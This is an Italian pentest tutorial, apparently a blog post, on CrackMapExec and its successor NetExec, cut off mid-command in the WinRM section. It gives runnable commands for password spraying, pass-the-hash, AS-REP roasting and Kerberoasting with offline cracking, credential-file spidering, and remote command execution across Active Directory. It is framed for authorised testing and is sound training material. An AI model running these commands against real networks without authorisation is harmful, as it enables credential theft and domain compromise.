---
title: 'CrackMapExec (CME): Lo Strumento Definitivo per il Penetration Testing'
slug: crackmapexec
description: 'CrackMapExec: guida pratica a SMB, WinRM, LDAP — password spraying, dump credenziali, lateral movement e moduli per Active Directory (post-exploitation).'
image: /Gemini_Generated_Image_9aprd09aprd09apr.webp
draft: false
date: 2026-01-30T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - cme
  - crackmapexec
---

# CrackMapExec (CME): Guida ai Comandi Legacy e alla Migrazione verso NetExec

CrackMapExec ha reso popolare un modo estremamente efficace di lavorare nelle reti Windows: un solo comando per mappare SMB, validare credenziali, individuare amministratori locali, enumerare Active Directory, eseguire comandi e raccogliere credenziali. Il progetto originale è però archiviato e non più mantenuto. Oggi il successore operativo è [NetExec](https://hackita.it/articoli/netexec), che conserva la stessa filosofia ma usa il binario `nxc`, riceve aggiornamenti e supporta protocolli e moduli moderni.

CrackMapExec, abbreviato **CME**, è stato per anni lo “Swiss Army knife” del penetration testing interno su Windows e [Active Directory](https://hackita.it/articoli/active-directory). La sua forza non era una singola tecnica, ma la capacità di concatenare rapidamente più fasi della kill chain:

```text
RICOGNIZIONE
    ↓
VALIDAZIONE CREDENZIALI
    ↓
PASSWORD SPRAYING CONTROLLATO
    ↓
IDENTIFICAZIONE ADMIN LOCALI
    ↓
ENUMERAZIONE SMB / LDAP
    ↓
LATERAL MOVEMENT
    ↓
CREDENTIAL DUMPING
    ↓
ESCALATION FINO AL DOMINIO
```

Il repository originale di CrackMapExec è stato archiviato il **6 dicembre 2023** ed è in sola lettura. Per nuovi laboratori, assessment e workflow professionali devi usare **NetExec**, il fork mantenuto dalla community. Questa guida conserva la keyword e il contesto storico di CrackMapExec, ma usa principalmente la sintassi moderna `nxc` per evitare di pubblicare comandi obsoleti o dipendenti da build legacy.

Per la guida esclusivamente dedicata al successore moderno consulta [NetExec (NXC): guida completa](https://hackita.it/articoli/netexec). Qui l'obiettivo è diverso: capire **cosa faceva CME, come si traducono oggi i suoi comandi e quali differenze evitare durante la migrazione**.

***

## CrackMapExec è Ancora Mantenuto?

No. Il progetto originale è archiviato e non riceve correzioni, compatibilità per nuove versioni di Python o aggiornamenti dei moduli. Questo significa che:

* alcune installazioni tramite PyPI o `pipx install crackmapexec` possono fallire;
* i moduli disponibili cambiano tra le vecchie release;
* opzioni trovate in guide storiche possono non esistere nella build installata;
* dipendenze come Impacket, `pyOpenSSL`, Samba o Python possono creare incompatibilità;
* i controlli per Windows recenti possono essere incompleti o produrre falsi negativi.

La migrazione normale è:

```text
crackmapexec  →  nxc
CME           →  NetExec
```

Nella maggior parte dei workflow di base basta sostituire il nome del binario, ma **non sempre**: Kerberos, certificati, logging, moduli e alcune opzioni hanno sintassi nuova.

***

## CrackMapExec vs NetExec

| Aspetto                   | CrackMapExec legacy                              | NetExec attuale                                                 |
| ------------------------- | ------------------------------------------------ | --------------------------------------------------------------- |
| Binario                   | `crackmapexec`                                   | `nxc`                                                           |
| Stato                     | Archiviato, sola lettura                         | Mantenuto dalla community                                       |
| Installazione consigliata | Nessuna per nuovi ambienti                       | `pipx` dal repository ufficiale o pacchetto della distribuzione |
| Compatibilità Python      | Dipende dalla vecchia release                    | Aggiornata regolarmente                                         |
| Kerberos                  | Sintassi variabile tra versioni                  | `-k` oppure `--use-kcache`                                      |
| Certificati               | Supporto limitato o assente nelle build vecchie  | PFX, PEM e generazione automatica della ccache                  |
| Moduli                    | Set congelato e dipendente dalla release         | Moduli aggiornati, ispezionabili con `nxc <protocollo> -L`      |
| Protocolli                | SMB, LDAP, WinRM, MSSQL e altri secondo la build | SMB, LDAP, WinRM, RDP, MSSQL, SSH, FTP, WMI, NFS, VNC e altri   |
| Uso consigliato           | Riproduzione di vecchi lab                       | Assessment moderni e manutenzione futura                        |

### Traduzione immediata dei comandi

```bash
# CME legacy
crackmapexec smb 10.10.10.0/24

# NetExec moderno
nxc smb 10.10.10.0/24
```

```bash
# CME legacy
crackmapexec smb 10.10.10.10 -u john -p 'Password123!'

# NetExec moderno
nxc smb 10.10.10.10 -u john -p 'Password123!'
```

Quando leggi una guida vecchia, usa questa regola:

```bash
nxc <protocollo> --help
nxc <protocollo> -L
nxc <protocollo> -M <modulo> --options
```

Non assumere che un modulo storico esista ancora o abbia lo stesso nome.

***

## Installazione Corretta nel 2026

### Metodo consigliato: NetExec tramite `pipx`

```bash
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

Ricarica la shell e verifica:

```bash
nxc --version
nxc --help
nxc smb --help
```

> **Aggiornamento di sicurezza:** usa almeno NetExec **v1.5.1**. La release del 23 febbraio 2026 corregge una vulnerabilità di arbitrary file write nel modulo `spider_plus`. Aggiorna l’installazione con `pipx upgrade netexec` oppure reinstalla dal repository ufficiale.

Su Kali Linux il pacchetto può essere disponibile direttamente nei repository:

```bash
sudo apt update
sudo apt install netexec
```

Controlla quale binario stai realmente eseguendo:

```bash
which nxc
nxc --version
```

### Aggiornamento con `pipx`

```bash
pipx upgrade netexec
```

Se l'installazione proviene direttamente da GitHub e il nome dell'ambiente differisce:

```bash
pipx list
pipx upgrade-all
```

### Perché non usare `pipx install crackmapexec`

Il pacchetto CrackMapExec non è la scelta corretta per un nuovo ambiente. Può installare una release vecchia, entrare in conflitto con dipendenze moderne o non corrispondere ai comandi documentati online. Mantienilo soltanto in una VM congelata quando devi riprodurre un vecchio laboratorio o una specifica versione del tool.

***

## Sintassi Base

```bash
nxc <protocollo> <target> -u <utente> -p <password> [opzioni]
```

Esempio:

```bash
nxc smb 10.10.10.10 -u 'john' -p 'Password123!'
```

Con dominio esplicito:

```bash
nxc smb 10.10.10.10 -d corp.local -u 'john' -p 'Password123!'
```

Con account locale:

```bash
nxc smb 10.10.10.10 --local-auth -u 'Administrator' -p 'Password123!'
```

> Racchiudi password e username con caratteri speciali tra apici singoli. Per valori che iniziano con `-`, usa la forma lunga con `=`: `-u='-utente' -p='-Password'`.

***

## Protocolli Supportati

Il set esatto dipende dalla versione installata. Verificalo sempre con:

```bash
nxc --help
```

I protocolli più importanti in un engagement interno sono:

| Protocollo | Uso principale                                                            | Collegamento Hackita                                                           |
| ---------- | ------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| `smb`      | Host discovery, share, sessioni, PTH, remote execution, dump SAM/LSA/NTDS | [SMB porta 445](https://hackita.it/articoli/smb)                               |
| `ldap`     | Utenti, gruppi, deleghe, Kerberoasting, AS-REP, gMSA, BloodHound          | [LDAP porta 389](https://hackita.it/articoli/porta-389-ldap)                   |
| `winrm`    | Validazione accesso PowerShell Remoting ed esecuzione comandi             | [Evil-WinRM](https://hackita.it/articoli/evilwinrm)                            |
| `mssql`    | Login SQL/Windows, query, `xp_cmdshell`, linked server                    | [MSSQL porta 1433](https://hackita.it/articoli/porta-1433-mssql)               |
| `rdp`      | Validazione credenziali, screenshot e accesso interattivo                 | [Porte TCP/UDP nel pentest](https://hackita.it/articoli/porte-tcp-udp-pentest) |
| `wmi`      | Remote execution tramite WMI/DCOM                                         | [WMIC e lateral movement](https://hackita.it/articoli/wmic)                    |
| `ssh`      | Validazione credenziali ed esecuzione su sistemi SSH                      | [SSH porta 22](https://hackita.it/articoli/ssh)                                |
| `ftp`      | Login anonimo, listing e trasferimento file                               | [FTP porta 21](https://hackita.it/articoli/porta-21-ftp)                       |

***

## Formati dei Target

```bash
# IP singolo
nxc smb 10.10.10.10

# CIDR
nxc smb 10.10.10.0/24

# Range
nxc smb 10.10.10.10-50

# File di target
nxc smb targets.txt

# Hostname FQDN
nxc smb WS01.corp.local

# Più target nella stessa esecuzione
nxc smb DC01.corp.local 10.10.10.0/24 targets.txt
```

### DNS esplicito

Nei workflow Kerberos la risoluzione DNS deve essere corretta. Puoi indicare il DNS del dominio:

```bash
nxc smb WS01.corp.local -d corp.local -u john -p 'Password123!' \
  --dns-server 10.10.10.10
```

Altre opzioni utili:

```bash
nxc smb WS01.corp.local -u john -p 'Password123!' --dns-timeout 5
nxc smb WS01.corp.local -u john -p 'Password123!' --dns-tcp
```

***

# Fase 0 — Ricognizione Senza Credenziali

## Scansione SMB della Subnet

```bash
nxc smb 10.10.10.0/24
```

L'output può mostrare:

* hostname;
* sistema operativo e build;
* dominio o workgroup;
* stato di SMB signing;
* presenza di SMBv1;
* nome NetBIOS.

Questi dati permettono di separare workstation, server, Domain Controller e sistemi legacy. Se SMB signing non è richiesto, l'host può diventare un target per [NTLM Relay](https://hackita.it/articoli/ntlm-relay), ma la sfruttabilità reale dipende dal protocollo di destinazione, dalle protezioni NTLM e dalla possibilità di ottenere un'autenticazione coercibile.

## Generare la Lista dei Target Relayable

```bash
nxc smb 10.10.10.0/24 --gen-relay-list relay-targets.txt
```

Controlla il file:

```bash
cat relay-targets.txt
```

Non avviare automaticamente il relay. Prima verifica scope, SMB signing, EPA, LDAP signing/channel binding e le regole d'ingaggio. Per la catena completa usa la guida [ntlmrelayx e NTLM Relay](https://hackita.it/articoli/ntlm-relay).

## Null Session

Nelle release moderne di NetExec usa credenziali vuote esplicite:

```bash
nxc smb 10.10.10.10 -u '' -p ''
```

Prova subito cosa è realmente enumerabile senza autenticazione:

```bash
nxc smb 10.10.10.10 -u '' -p '' --shares
nxc smb 10.10.10.10 -u '' -p '' --pass-pol
nxc smb 10.10.10.10 -u '' -p '' --users
```

Il vecchio flag `--null-session` compare in cheat sheet e build legacy, ma non va dato per disponibile nelle release correnti: verifica sempre con `nxc smb --help`.

## Guest Login

```bash
nxc smb 10.10.10.10 -u 'guest' -p ''
```

Una risposta positiva non implica accesso amministrativo. Verifica cosa può realmente leggere l'account:

```bash
nxc smb 10.10.10.10 -u 'guest' -p '' --shares
```

## RID Brute senza Credenziali

Quando SAMR è accessibile tramite sessione anonima o guest:

```bash
nxc smb 10.10.10.10 -u '' -p '' --rid-brute
```

Il RID brute ricostruisce utenti e gruppi risolvendo SID incrementali. È utile per ottenere una lista di username da usare in [AS-REP Roasting](https://hackita.it/articoli/as-rep-roasting) o in uno spray autorizzato.

***

# Fase 1 — Autenticazione e Validazione delle Credenziali

## Password in Chiaro

```bash
nxc smb 10.10.10.10 -d corp.local -u 'john' -p 'Password123!'
```

Su più host:

```bash
nxc smb 10.10.10.0/24 -d corp.local -u 'john' -p 'Password123!'
```

### Come leggere l'output

* `[-]` indica autenticazione fallita o accesso negato;
* `[+]` indica credenziali valide per quel protocollo;
* `(Pwn3d!)` indica che NetExec ha verificato capacità di esecuzione o privilegi elevati secondo il protocollo;
* su SMB, `(Pwn3d!)` significa normalmente che l'account dispone di privilegi amministrativi locali sufficienti per le operazioni remote testate;
* su altri protocolli il significato non è identico: non trattarlo come sinonimo universale di Domain Admin.

## Autenticazione Locale

Usa `--local-auth` quando la credenziale appartiene al SAM locale e non al dominio:

```bash
nxc smb 10.10.10.10 --local-auth \
  -u 'Administrator' -p 'LocalPassword123!'
```

Su un'intera subnet, la stessa password locale riutilizzata può trasformarsi rapidamente in lateral movement. È uno dei motivi per cui Windows LAPS è fondamentale. Per approfondire consulta [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash) e la sezione LAPS più avanti.

## Pass-the-Hash

NetExec accetta l'NT hash con `-H`:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' \
  -H '8846f7eaee8fb117ad06bdd830b7586c'
```

Puoi usare anche il formato LM:NT:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' \
  -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'
```

Account locale:

```bash
nxc smb 10.10.10.10 --local-auth \
  -u 'Administrator' \
  -H '8846f7eaee8fb117ad06bdd830b7586c'
```

Il [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash) non “cracca” la password: usa direttamente il segreto NTLM nei protocolli che accettano autenticazione NTLM.

## Kerberos con Password o Hash

La sintassi moderna usa `-k`:

```bash
nxc smb WS01.corp.local -d corp.local \
  -u 'john' -p 'Password123!' -k \
  --dns-server 10.10.10.10
```

Con NT hash:

```bash
nxc smb WS01.corp.local -d corp.local \
  -u 'john' -H '8846f7eaee8fb117ad06bdd830b7586c' -k \
  --dns-server 10.10.10.10
```

> Il vecchio esempio `--kerberos` non è la sintassi da usare come riferimento moderno. Controlla sempre `nxc smb --help` nella versione installata.

## Kerberos con Ticket in Cache

Esporta la ccache ottenuta con Impacket, Rubeus, Certipy o altri strumenti:

```bash
export KRB5CCNAME=/tmp/administrator.ccache
```

Usa il ticket:

```bash
nxc smb WS01.corp.local --use-kcache
```

Esecuzione con ticket:

```bash
nxc smb WS01.corp.local --use-kcache -x 'whoami'
```

Per i concetti di TGT, TGS, SPN e Pass-the-Ticket consulta [Kerberos in Active Directory](https://hackita.it/articoli/kerberos) e [Rubeus](https://hackita.it/articoli/rubeus).

## Autenticazione con Certificato

NetExec moderno può usare certificati PFX o PEM e generare una ccache:

```bash
nxc smb WS01.corp.local \
  --pfx-cert user.pfx \
  --pfx-pass 'PfxPassword' \
  -u 'user'
```

Con PEM:

```bash
nxc smb WS01.corp.local \
  --pem-cert user.pem \
  --pem-key user.key \
  -u 'user'
```

Questo workflow è utile dopo un abuso di AD CS con [Certipy](https://hackita.it/articoli/certipy) o una delle tecniche [ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

# Fase 2 — Password Spraying Senza Bloccare il Dominio

Il password spraying prova **una password contro molti account**, invece di molte password contro un singolo account. È diverso dal brute force classico e riduce il rischio di superare la soglia di lockout per utente, ma non è “sicuro per definizione”: una policy fine-grained, tentativi precedenti o controlli adattivi possono comunque bloccare account.

Prima di qualsiasi spray leggi [Password Spraying](https://hackita.it/articoli/password-spraying) e verifica sempre le regole d'ingaggio.

## Leggere la Password Policy

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --pass-pol
```

Annota almeno:

* lockout threshold;
* lockout duration;
* observation window;
* password history;
* password age;
* eventuali Fine-Grained Password Policy.

Per le PSO via LDAP:

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --pso
```

## Molti Utenti, Una Password

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u users.txt \
  -p 'Summer2026!'
```

Continua dopo il primo successo:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u users.txt \
  -p 'Summer2026!' \
  --continue-on-success
```

## Coppie Username/Password Riga per Riga

Senza `--no-bruteforce`, due file possono produrre il prodotto cartesiano di tutte le combinazioni. Per testare soltanto la coppia corrispondente riga per riga:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u users.txt \
  -p passwords.txt \
  --no-bruteforce \
  --continue-on-success
```

Esempio:

```text
users.txt       passwords.txt
---------       -------------
mario           Password1!
luigi           Welcome2!
anna            Estate2026!
```

## Throttling con Jitter

Il jitter inserisce un ritardo casuale tra le autenticazioni sul singolo host:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u users.txt -p passwords.txt \
  --jitter 3
```

Intervallo casuale:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u users.txt -p passwords.txt \
  --jitter 5-12
```

Ritardo fisso:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u users.txt -p passwords.txt \
  --jitter 8-8
```

> Il throttling è per-host. Spruzzare contemporaneamente la stessa lista su molti server può moltiplicare i tentativi registrati dal dominio.

## Scelta del Protocollo

| Protocollo | Vantaggio                                    | Rischio / log tipico                   |
| ---------- | -------------------------------------------- | -------------------------------------- |
| SMB        | Copertura ampia e immediata                  | 4625/4776, rumore elevato              |
| LDAP       | Test diretto sul DC e successiva enumeration | 4625/4771/4776 secondo autenticazione  |
| Kerberos   | Utile con FQDN e DNS corretto                | 4771 per pre-auth fallita              |
| WinRM      | Conferma accesso amministrativo remoto       | 4624/4625 e log WinRM                  |
| MSSQL      | Valida account SQL o Windows su DB           | SQL audit + 4624/4625 per Windows auth |

***

# Fase 3 — Enumerazione SMB

SMB è il protocollo più ricco per un assessment Windows. Permette di individuare share, utenti loggati, sessioni, gruppi locali, policy, dischi e host sui quali una credenziale ha privilegi amministrativi.

## Elencare le Share

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --shares
```

L'output distingue normalmente permessi come `READ`, `WRITE` o accesso negato. Una share scrivibile non equivale automaticamente a RCE, ma può contenere:

* script di logon modificabili;
* installer distribuiti via rete;
* file di configurazione;
* backup;
* credenziali in chiaro;
* documenti con dati sensibili.

Per navigazione manuale usa anche [smbclient](https://hackita.it/articoli/smbclient).

## Spider Mirato

Cerca file contenenti `password` nel nome sulla share `C$`:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --spider C\$ \
  --pattern password
```

Altri pattern utili in un pentest autorizzato:

```text
pass
credential
backup
config
web.config
unattend
vnc
rdp
kdbx
pfx
pem
```

## Spider Completo con `spider_plus`

Elenca tutti i file leggibili:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  -M spider_plus
```

Visualizza le opzioni disponibili nella build installata:

```bash
nxc smb -M spider_plus --options
```

Scarica i file leggibili soltanto se scope e volume lo permettono:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  -M spider_plus \
  -o DOWNLOAD_FLAG=True
```

Il download indiscriminato può produrre un volume enorme di dati e violare regole di minimizzazione. In un assessment reale preferisci filtri e campionamento.

## Enumerare Utenti, Gruppi e Computer via SMB

Utenti di dominio:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --users
```

Esporta gli utenti quando devi riutilizzarli in altre fasi:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --users-export domain-users.txt
```

Gruppi di dominio:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --groups
```

Membri di un gruppo specifico:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --groups 'Domain Admins'
```

Computer del dominio:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --computers
```

Il parser SMB corrente espone tutte e tre le opzioni. Alcuni pacchetti precedenti le hanno spostate o documentate soltanto sotto LDAP: quando una build le rifiuta, usa `nxc ldap ... --groups` e `nxc ldap ... --computers`.

## Gruppi Locali

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --local-groups
```

Per enumerare un gruppo locale specifico:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --local-groups 'Administrators'
```

Questa enumerazione permette di capire quali utenti o gruppi di dominio sono amministratori locali sul target.

## Utenti Loggati e Sessioni

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --loggedon-users
```

Sessioni SMB attive:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --smb-sessions
```

Sessioni e profili caricati tramite Remote Registry:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --reg-sessions
```

Sessioni RDP:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --qwinsta
```

Questi controlli sono utili per evitare di eseguire operazioni intrusive su host con sessioni amministrative attive e per documentare i rischi di credential exposure.

## RID Brute Autenticato

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --rid-brute
```

Limita il range quando supportato dalla build e non ciclare migliaia di RID senza necessità.

## Interfacce e Dischi

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --interfaces
```

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --disks
```

Le interfacce possono rivelare reti di management o segmenti non raggiungibili direttamente, alimentando un successivo workflow di [pivoting](https://hackita.it/articoli/pivoting).

***

# Fase 4 — Enumerazione LDAP e Active Directory

LDAP espone la struttura logica del dominio. Un account a basso privilegio può normalmente leggere utenti, gruppi, computer, SPN, deleghe, trust e molte ACL. Per query manuali approfondite consulta [ldapsearch](https://hackita.it/articoli/ldapsearch).

## Utenti Attivi

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --users
```

Solo account abilitati:

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --active-users
```

## Gruppi e Computer

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --groups
```

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --computers
```

## Domain Controller e SID del Dominio

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --dc-list
```

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --get-sid
```

## Account con `adminCount=1`

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --admin-count
```

`adminCount=1` non dimostra che l'account sia attualmente Domain Admin. Indica che l'oggetto è o è stato protetto da AdminSDHolder e merita una verifica ulteriore.

## Account con Password Non Richiesta

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --password-not-required
```

Il flag `PASSWD_NOTREQD` non garantisce una password vuota, ma segnala una configurazione debole da verificare.

## Deleghe Kerberos

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --find-delegation
```

Unconstrained Delegation:

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --trusted-for-delegation
```

Per capire RBCD, constrained delegation e S4U consulta [RBCD](https://hackita.it/articoli/rbcd) e [Kerberos](https://hackita.it/articoli/kerberos).

## Query LDAP Personalizzata

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --query '(sAMAccountName=Administrator)' \
  'sAMAccountName objectClass pwdLastSet'
```

Ricerca account con SPN:

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --query '(&(objectClass=user)(servicePrincipalName=*))' \
  'sAMAccountName servicePrincipalName'
```

## AS-REP Roasting

Con lista username e senza credenziali valide:

```bash
nxc ldap 10.10.10.10 \
  -u users.txt \
  -p '' \
  --asreproast asrep.txt
```

Con credenziali valide:

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --asreproast asrep.txt
```

Cracking offline:

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

L'AS-REP Roasting colpisce account con pre-autenticazione Kerberos disabilitata. Leggi la guida dedicata [AS-REP Roasting](https://hackita.it/articoli/as-rep-roasting).

## Kerberoasting

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --kerberoasting kerberoast.txt
```

Cracking RC4 TGS:

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

Il Kerberoasting richiede normalmente un account di dominio valido e prende di mira service account con SPN. Approfondisci in [Kerberoasting](https://hackita.it/articoli/kerberoasting).

## Kerberoasting tramite Account AS-REP Roastable

```bash
nxc ldap 10.10.10.10 \
  -u 'utente_senza_preauth' \
  -p '' \
  --no-preauth-targets targets.txt \
  --kerberoasting kerberoast.txt
```

## BloodHound Collection

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --bloodhound \
  --collection All \
  --dns-server 10.10.10.10
```

La raccolta alimenta [BloodHound](https://hackita.it/articoli/bloodhound), che permette di collegare sessioni, gruppi, ACL, deleghe e privilegi in attack path verso account di alto valore.

## gMSA

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  --gmsa
```

L'output è utile soltanto se l'account possiede i permessi per leggere `msDS-ManagedPassword`. Il risultato non deve essere trattato come un “dump automatico” garantito.

## Descrizioni Utente

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  -M get-desc-users
```

Le descrizioni possono contenere note operative, password temporanee o informazioni sui service account. Documenta il finding senza raccogliere dati oltre il necessario.

## Machine Account Quota

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  -M maq
```

Un valore superiore a zero può essere prerequisito per catene con machine account e [RBCD](https://hackita.it/articoli/rbcd), ma non costituisce da solo una compromissione.

## LDAP Signing e Channel Binding

```bash
nxc ldap 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  -M ldap-checker
```

Questo controllo aiuta a valutare la superficie di relay LDAP. La sfruttabilità dipende dalla combinazione tra LDAP signing, channel binding, EPA, NTLM e tipo di autenticazione coercibile.

***

# Fase 5 — Identificare Amministratori Locali e Capacità di Esecuzione

Uno degli output più riconoscibili di CrackMapExec era:

```text
(Pwn3d!)
```

NetExec conserva lo stesso concetto: quando una credenziale autenticata possiede i privilegi richiesti dal protocollo per l'esecuzione remota, il tool aggiunge `(Pwn3d!)` al risultato.

```bash
nxc smb 10.10.10.0/24 -d corp.local \
  -u 'john' -p 'Password123!'
```

Esempio concettuale:

```text
SMB  10.10.10.21  445  WS21  [+] CORP\john:Password123! (Pwn3d!)
SMB  10.10.10.22  445  WS22  [+] CORP\john:Password123!
```

Questo significa che l'account dispone di capacità amministrative utili sul primo host, non che l'intero dominio sia compromesso. Prima di muoverti lateralmente verifica:

* se l'account è amministratore locale diretto o tramite gruppo;
* se UAC remoto limita i token degli account locali;
* se WMI, Service Control Manager o Task Scheduler sono raggiungibili;
* se EDR e application control bloccano il metodo scelto;
* se il target rientra esattamente nello scope autorizzato.

Per capire il contesto completo consulta anche [pivoting e lateral movement](https://hackita.it/articoli/pivoting), [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash) e [NTLM](https://hackita.it/articoli/ntlm).

## Verifica Esplicita degli Admin Locali

```bash
nxc smb 10.10.10.0/24 -d corp.local \
  -u 'john' -p 'Password123!' \
  --local-auth
```

`--local-auth` non “cerca automaticamente gli admin locali”: forza l'autenticazione nel contesto dell'account locale del target. È utile quando stai validando una credenziale locale riutilizzata su più workstation.

```bash
nxc smb workstations.txt \
  -u 'Administrator' \
  -H '8846f7eaee8fb117ad06bdd830b7586c' \
  --local-auth
```

Questa è una classica verifica di **local administrator password reuse**. In ambienti correttamente gestiti con Windows LAPS, la password locale dovrebbe essere diversa per ogni host.

***

# Fase 6 — Command Execution con SMB

L'esecuzione di comandi via SMB richiede normalmente privilegi amministrativi locali sul target. NetExec offre quattro metodi selezionabili nel parser SMB corrente:

| Metodo    | Meccanismo              | Artefatti principali                       | Quando provarlo                                                           |
| --------- | ----------------------- | ------------------------------------------ | ------------------------------------------------------------------------- |
| `wmiexec` | WMI/DCOM                | Eventi WMI, process creation, traffico RPC | Primo tentativo nel fallback automatico corrente                          |
| `atexec`  | Scheduled Task          | Creazione ed esecuzione di task            | Secondo tentativo; utile quando WMI non è disponibile                     |
| `smbexec` | Service Control Manager | Servizio temporaneo, eventi SCM            | Terzo tentativo; più evidente lato servizi                                |
| `mmcexec` | DCOM tramite MMC        | Attivazione DCOM e process creation        | Ultimo fallback; nelle release correnti presenta limitazioni con Kerberos |

Per una spiegazione dedicata del service-based execution consulta [smbexec](https://hackita.it/articoli/smbexec).

## Esecuzione CMD

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  -x 'whoami'
```

## Esecuzione PowerShell

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  -X '$PSVersionTable.PSVersion'
```

## Forzare un Metodo Specifico

```bash
# WMI
nxc smb 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --exec-method wmiexec \
  -x 'whoami /all'
```

```bash
# MMC/DCOM
nxc smb 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --exec-method mmcexec \
  -x 'whoami'
```

```bash
# Scheduled Task
nxc smb 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --exec-method atexec \
  -x 'hostname'
```

```bash
# Service Control Manager
nxc smb 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --exec-method smbexec \
  -x 'ipconfig /all'
```

NetExec prova normalmente i metodi in questo ordine:

```text
wmiexec → atexec → smbexec → mmcexec
```

Se un metodo fallisce, può passare al successivo. Durante un test professionale è spesso preferibile forzare il metodo, così da sapere quali artefatti stai producendo e documentare correttamente l'evidenza.

## Command Execution con Pass-the-Hash

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'administrator' \
  -H '8846f7eaee8fb117ad06bdd830b7586c' \
  -x 'whoami'
```

Perché funzioni, l'hash deve appartenere a un account che possiede i privilegi necessari sul target e NTLM non deve essere bloccato per quel flusso.

## Command Execution con Kerberos

```bash
nxc smb ws20.corp.local -d corp.local \
  -u 'john' -p 'Password123!' \
  -k \
  -x 'whoami'
```

Con ticket già presente:

```bash
export KRB5CCNAME=/tmp/john.ccache
nxc smb ws20.corp.local \
  --use-kcache \
  -x 'whoami'
```

Con Kerberos usa preferibilmente il **FQDN** del target, DNS corretto e orario sincronizzato. IP, hostname non risolvibile o clock skew sono le cause più comuni degli errori.

***

# Fase 7 — WinRM, WMI, RDP e MSSQL

CrackMapExec era conosciuto soprattutto per SMB, ma i workflow moderni di NetExec permettono di validare la stessa identità su protocolli diversi. Non confondere però “credenziale valida” con “diritto di accesso”: ogni servizio applica gruppi, ACL e policy differenti.

## WinRM

```bash
nxc winrm 10.10.10.20 -d corp.local \
